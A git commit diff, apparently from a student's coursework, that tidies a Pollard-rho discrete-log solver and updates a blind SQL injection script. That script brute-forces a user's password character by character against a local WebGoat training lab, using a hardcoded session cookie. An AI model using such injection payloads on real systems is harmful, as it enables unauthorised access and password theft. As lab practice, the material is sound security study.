679784069f8422f5fb6f2043f469d47edd1f91c8
GabrielWechta <wechtagabriel@gmail.com>
2022-03-17 09:26:51 +0100

    small enchanment for pollard-rho method

--- elyptic_curves/list_1/main.py
+++ elyptic_curves/list_1/main.py
@@ -1,3 +1,8 @@
+import random
+
+from sympy import isprime, nextprime
+
+
 def order(element, prime):
     for power in range(1, prime):
         if (element ** power) % p == 1:
@@ -21,20 +26,21 @@ def f(x, a, b, p, q, g, y):
     return x_new, a_new, b_new
 
 
-def pollard_rho(g, y, p, Alpha=0, Beta=0):
+def pollard_rho(g, y, p, Alpha=0, Beta=0, q=None):
     if g == y: return 1
 
     T = pow(g, Alpha, p) * pow(y, Beta, p)
-    q = order(g, p)
-    print(f'{q=}')
+    if q is None:  # if q is not passed, order is calculated via order func
+        q = order(g, p)
 
+    # initializing constant values for Pollard Rho Algorithm
     H, Gamma, Zeta = T, Alpha, Beta
     while True:
         T, Alpha, Beta = f(T, Alpha, Beta, p, q, g, y)
         H, Gamma, Zeta = f(*f(H, Gamma, Zeta, p, q, g, y), p, q, g, y)
-        print(f"{T=}, {Alpha=}, {Beta=}")
-        print(f"{H=}, {Gamma=}, {Zeta=}")
-        print()
+        # print(f"{T=}, {Alpha=}, {Beta=}")
+        # print(f"{H=}, {Gamma=}, {Zeta=}")
+        # print()
         if T % p == H % p:
             if Zeta % q != Beta % q:
                 x = (Alpha - Gamma) * pow(Zeta - Beta, -1, q) % q
@@ -44,10 +50,36 @@ def pollard_rho(g, y, p, Alpha=0, Beta=0):
                 return
 
 
-def test():
+def initialize_dlp(n):
+    # idea of initializing values for hard dlp
+    bottom_number = pow(2, n - 1) + 1
 
-    strong_prime =
+    # generating p
+    while True:
+        p_dash = nextprime(bottom_number)
+        p = 2 * p_dash + 1
+        if isprime(p):
+            break
+        else:
+            bottom_number = p_dash
+    # generating g
+    while True:
+        g = random.randint(2, p - 1)
+        g_dash = pow(g, 2, p)
+        if g_dash % p != 1:
+            break
+
+    print(f"{bottom_number=}, {p_dash=}, {p=}, {g_dash=}, {g=}")
+
+    return p_dash, p, g_dash, g
 
 
 if __name__ == "__main__":
-    test()
+    for i in range(2, 40):
+        print(i)
+        p_dash, p, g_dash, g = initialize_dlp(i)
+        x_to_solve = random.randint(2, p_dash)
+        y = pow(g_dash, x_to_solve, p)
+        x = pollard_rho(g=g_dash, y=y, p=p)
+        print(f"{x_to_solve=}, {x=}, {g_dash=}, {y=}, {p=}, g^x = {pow(g_dash, x, p)}")
+        print()
--- system_security/A1_injection/inject_script.py
+++ system_security/A1_injection/inject_script.py
@@ -3,17 +3,17 @@ import requests
   
 def sql_injection_advance_5():  
         alphabet_index = 0  
-        alphabet = 'abcdefghijklmnopqrstuvwxyz'  
+        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'  
         password_index = 0  
         password = ''  
 
         headers = {  
-        'Cookie': COOKIE,  
+        'Cookie': 'JSESSIONID=uSh5ol6NLCL2AEWY6drKuCO1dxZxXbMZDTrqAeV7',  
         }  
 
         while True:  
-
                 payload = f'tom\' AND substring(password,{password_index + 1},1)=\'{alphabet[alphabet_index]}'
+                print(alphabet[alphabet_index])
 
                 data = {  
                 'username_reg': payload,  
@@ -23,23 +23,17 @@ def sql_injection_advance_5():
                 }  
 
                 r = requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=headers, data=data)  
-                r = requests.put('http://localhost:8080/WebGoat/start.mvc#lesson/SqlInjectionAdvanced.lesson/4', headers=headers, data=data)  
+                response = json.loads(r.text)
 
-
-                try:  
-                        response = json.loads(r.text)  
-                except:  
-                        print("Wrong JSESSIONID, find it by looking at your requests once logged in.")  
-                        return  
-
-                if "already exists please try to register with a different username" not in response['feedback']:  
-                        alphabet_index += 1  
-                        if alphabet_index > len(alphabet) - 1:  
-                                return  
-                else:  
+                if "already exists" in response['feedback']:  
                         password += alphabet[alphabet_index]  
                         print(password)  
                         alphabet_index = 0  
                         password_index += 1  
+                else:  
+                        alphabet_index += 1  
+                        if alphabet_index > len(alphabet) - 1:  
+                                return  
+
   
 sql_injection_advance_5()
